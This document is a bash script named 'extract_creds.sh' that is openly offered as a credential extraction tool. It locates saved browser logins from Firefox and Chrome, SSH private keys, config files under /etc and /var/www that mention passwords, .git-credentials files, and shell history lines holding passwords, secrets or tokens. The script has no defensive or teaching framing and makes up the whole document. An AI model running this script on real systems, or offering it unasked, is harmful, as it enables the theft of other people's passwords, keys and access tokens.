#!/bin/bash
# extract_creds.sh - Credential extraction from common locations
# Usage: ./extract_creds.sh

echo "=========================================="
echo "     Credential Extraction Script        "
echo "=========================================="

echo -e "\n[*] Searching for credentials..."

# Browser data
echo -e "\n[*] Browser credential locations:"
ls -la ~/.mozilla/firefox/*.default*/logins.json 2>/dev/null
ls -la ~/.config/google-chrome/Default/Login\ Data 2>/dev/null

# SSH keys
echo -e "\n[*] SSH Keys:"
find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Config files with passwords
echo -e "\n[*] Searching config files for passwords..."
grep -rIl "password" /etc/ 2>/dev/null | head -10
grep -rIl "password" /var/www/ 2>/dev/null | head -10

# .git credentials
echo -e "\n[*] Git credentials:"
find / -name ".git-credentials" 2>/dev/null

# History files
echo -e "\n[*] History files with potential creds:"
grep -h "pass\|secret\|key\|token" ~/.bash_history ~/.zsh_history 2>/dev/null | head -10

echo -e "\n[*] Extraction complete"
